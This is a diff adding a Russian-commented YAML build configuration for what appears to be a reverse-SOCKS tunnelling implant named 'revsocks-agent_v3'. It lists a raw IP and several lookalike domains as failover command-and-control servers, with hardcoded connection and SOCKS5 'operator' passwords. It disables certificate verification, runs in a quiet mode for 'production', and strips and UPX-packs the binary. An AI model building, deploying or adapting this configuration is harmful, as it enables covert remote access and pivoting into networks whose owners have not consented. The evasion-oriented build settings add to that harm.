@@ -1,0 +1,51 @@
+# ============================================
+# AGENT - Настройки агента (build-time)
+# ============================================
+agent:
+  # Пароль для подключения к серверу
+  password: "SFOpkm3rffAds90SF3ghSD"
+
+  servers:
+    - address: "wss://91.132.93.251:443"
+      name: "main"
+    - address: "wss://bestutyresdomaonupder.com:10443"
+      name: "backup1"
+    - address: "wss://bestutyresdomaonupder.top:443"
+      name: "backup2"
+    - address: "wss://bestutyresdomaonupder2324.com:443"
+      name: "backup3"
+  
+  # Failover настройки
+  failover:
+    retry_count: 3           # Попыток на каждый сервер
+    retry_interval: 300        # Секунд между попытками
+    full_cycle_pause: 3600    # Секунд перед повтором полного цикла
+  
+  # Режим работы
+  tls_enabled: true          # Использовать TLS шифрование
+  use_websocket: true       # true = WSS режим, false = TCP режим
+  verify: false              # Проверять TLS сертификат (false для самоподписанных)
+  quiet_mode: true          # false = выводить логи в консоль, для продакшена true, для локального теста false
+  
+  # Yamux настройки
+  yamux:
+    enable_keepalive: true
+    keepalive_interval: 30   # секунды
+    write_timeout: 60         # секунды
+  
+  # SOCKS5 аутентификация (опционально)
+  socks_auth:
+    enabled: true
+    username: "operator"
+    password: "FJd30slWp3kmS3f"
+
+# ============================================
+# BUILD - Настройки сборки
+# ============================================
+build:
+  output_name: "revsocks-agent_v3"
+  strip_symbols: true
+  upx:
+    enabled: true
+    level: 7
+    lzma: true
